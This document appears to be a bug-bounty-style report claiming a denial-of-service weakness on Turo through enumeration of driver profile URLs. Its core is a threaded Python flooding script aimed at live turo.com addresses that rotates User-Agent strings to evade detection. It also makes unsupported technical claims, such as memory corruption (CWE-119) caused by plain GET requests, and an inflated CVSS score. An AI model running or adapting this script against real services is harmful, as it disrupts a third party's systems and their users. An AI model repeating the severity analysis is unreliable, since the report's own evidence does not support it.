# Turbo

---

### Vulnerability Overview:
**Title**: Directory Enumeration Leading to Potential Resource Exhaustion (Ddos) on Turo

**Summary**:
A vulnerability has been identified on Turo that could lead to resource exhaustion or a Denial of Service (Ddos) attack. By manipulating the last 8 digits in the URL of driver profiles, an attacker can flood the server with requests, potentially overwhelming the system and causing significant performance degradation or outages.

### Steps to Reproduce:
1. **Identify a Turo driver profile URL**. For example, `https://turo.com/gb/en/drivers/15418658`.
2. **Run the provided Python script** (see below) to generate and send randomized requests to similar URLs by changing the last 8 digits.
3. Observe how the server handles these requests and whether it results in resource exhaustion or increased response times.

### CWE IDs:
- **CWE-400**: Uncontrolled Resource Consumption ('Resource Exhaustion')
  - This CWE describes scenarios where an application allows unintentional or intentional resource exhaustion through excessive requests or similar means.
- **CWE-703**: Improper Check or Handling of Exceptional Conditions
  - The server's inability to handle a large number of incoming requests or improper handling of high traffic falls into this category.
- **CWE-119**: Improper Restriction of Operations within the Bounds of a Memory Buffer
  - This CWE pertains to potential memory corruption or overflow due to excessive input.

### CVSS Score:
Considering the potential for resource exhaustion and minor memory issues, the CVSS score is adjusted as follows:

- **CVSS Base Score**: 7.7 (High)
  - **Attack Vector (AV)**: Network (N)
  - **Attack Complexity (AC)**: Low (L)
  - **Privileges Required (PR)**: None (N)
  - **User Interaction (UI)**: None (N)
  - **Scope (S)**: Unchanged (U)
  - **Confidentiality (C)**: None (N)
  - **Integrity (I)**: Low (L) – Reflecting potential, though limited, impact on system integrity (e.g., memory corruption).
  - **Availability (A)**: High (H)

**Justification**:
- The attack is conducted over a network with low complexity and no special privileges.
- The integrity score is adjusted to Low due to potential minor memory corruption.
- The availability impact remains High due to the potential for significant service disruption.

### Impact:
- **Availability**: High — The service could become significantly slower or unresponsive due to resource exhaustion.
- **Integrity**: Low — Potential for minor memory corruption, though this impact is limited.
- **Reputation**: Potential damage to Turo's reputation if the service is disrupted.
- **User Experience**: Users could experience poor performance, data corruption, or service outages.

### Recommendations:
- Implement rate limiting on requests to driver profile URLs.
- Monitor for and block unusual patterns or excessive request frequencies.
- Validate and restrict URL patterns to mitigate resource exhaustion and memory issues.

### Python Script

The updated script below uses threading to maximize the load on the server by sending multiple concurrent requests. This approach increases the potential for resource exhaustion and demonstrates the vulnerability more aggressively.

**How to Use the Script:**
1. Install Python and the `requests` and `threading` libraries if not already installed (`pip install requests`).
2. Copy the script below into a `.py` file (e.g., `turo_ddos_test.py`).
3. Run the script using the command `python turo_ddos_test.py`.
4. The script will send up to 1000 requests per URL concurrently, simulating a high-intensity attack.

```bash
python3 turbo.py
```

```python
import requests
import random
import threading

# Define a list of random User-Agent strings
user_agents = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0.3 Safari/605.1.15",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0.3 Mobile/15E148 Safari/604.1"
]

def generate_random_url(base_url):
    # Generate a random 8-digit number
    random_digits = ''.join([str(random.randint(0, 9)) for _ in range(8)])
    # Replace the last 8 characters of the base URL
    return base_url[:-8] + random_digits

def send_request(url):
    random_url = generate_random_url(url)
    headers = {
        "User-Agent": random.choice(user_agents)
    }
    try:
        response = requests.get(random_url, headers=headers)
        print(f"Request: {random_url} - Status Code: {response.status_code}")
    except requests.exceptions.RequestException as e:
        print(f"Request failed: {e}")

def thread_function(base_url, num_requests):
    for _ in range(num_requests):
        send_request(base_url)

if __name__ == "__main__":
    base_urls = [
        "https://turo.com/gb/en/drivers/15418658",
        "https://turo.com/gb/en/drivers/11023149",
        "https://turo.com/gb/en/drivers/7828042",
        "https://turo.com/gb/en/drivers/3474096"
    ]

    num_threads = 10  # Number of concurrent threads
    requests_per_thread = 100  # Number of requests per thread

    threads = []
    for base_url in base_urls:
        for _ in range(num_threads):
            thread = threading.Thread(target=thread_function, args=(base_url, requests_per_thread))
            thread.start()
            threads.append(thread)

    for thread in threads:
        thread.join()

```

**Disclaimer**: This script should only be run in a controlled environment where you have explicit permission to perform such tests. Unauthorized use on a live system could violate terms of service and be illegal.

---
